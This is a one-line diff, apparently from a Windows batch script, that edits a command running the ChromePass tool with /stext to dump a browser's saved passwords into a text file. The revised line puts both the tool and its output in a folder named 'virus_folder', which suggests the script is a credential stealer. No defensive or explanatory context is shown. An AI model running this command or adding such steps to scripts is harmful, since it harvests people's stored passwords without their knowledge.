@@ -1,1 +1,1 @@
-start ChromePass.exe /stext chrome.txt
+start C:\virus_folder\ChromePass.exe /stext C:\virus_folder\chrome.txt
